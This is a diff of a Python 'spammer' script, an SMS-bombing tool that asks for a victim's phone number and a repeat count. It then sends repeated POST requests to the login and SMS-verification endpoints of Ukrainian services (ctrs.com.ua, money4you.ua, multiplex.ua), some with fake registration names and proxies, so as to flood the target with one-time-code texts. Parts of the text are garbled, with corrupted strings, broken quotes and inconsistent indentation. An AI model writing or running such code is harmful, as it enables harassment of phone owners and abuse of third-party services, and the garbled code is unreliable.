@@ -37,13 +37,13 @@ NUMBER = input('[green]Beeante HOMeP tenedona: (бes + ')
 
 run = int(console.input('[green]Введите количество повторов (1-35):\n[blue]spammer>> '))
 for _ in track(range(run)):
- try:
-     print('Отправлено')
-     response = requests.post('https://my.ctrs.com.ua/api/auth/login', headers=headers, data={'phone' :  NUMBER})
- except:
-     print('Не доставлено')
- try:
-     print('Отправлено')
-     response = requests.post('https://my.ctrs.com.ua/api/auth/login', headers=headers, data={'phone': "+" + NUMBER})
- except:
-     print('Не доставлено')
+                    try:
+                        requests.post("https://money4you.ua/api/clientRegistration/sendValidationSms", data={"fathersName": "Витальевич", "firstName": "Виталий", "lastName": "Соколов", "phone": "+" + number, "udriveEmployee": "false"}, headers=headers, proxies=proxies)
+                        print("отправлена")
+                 except:
+                        print( YT отправлена")
+                    try:
+                        requests.post("https://auth.multiplex.ua/login", data={"login": "+" + number}, headers=headers)
+                        print('multiplex')
+                 except:
+                        print('Не доставлено (multiplex)')
